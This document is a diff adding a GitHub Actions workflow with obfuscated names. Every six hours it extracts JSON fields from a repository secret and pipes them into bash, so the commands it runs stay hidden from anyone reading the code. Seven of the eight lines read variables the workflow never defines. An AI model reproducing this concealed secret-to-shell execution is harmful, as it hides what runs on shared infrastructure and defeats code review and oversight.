@@ -1,0 +1,26 @@
+name: shengxiaofengzao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shengxiaofengzao
+        env:
+          fs53000: ${{ secrets.fs53000 }}
+        run: |
+          echo $fs53000 | jq -r .u8 | /bin/bash
+          echo $fqc6 | jq -r .q7042 | /bin/bash
+          echo $jjt193 | jq -r .cehj4930 | /bin/bash
+          echo $nr9 | jq -r .tpwi33328 | /bin/bash
+          echo $nd32754 | jq -r .jowv7073 | /bin/bash
+          echo $bssv1155 | jq -r .aw5357 | /bin/bash
+          echo $qim01610 | jq -r .tyklr1 | /bin/bash
+          echo $it1 | jq -r .swj74 | /bin/bash
+
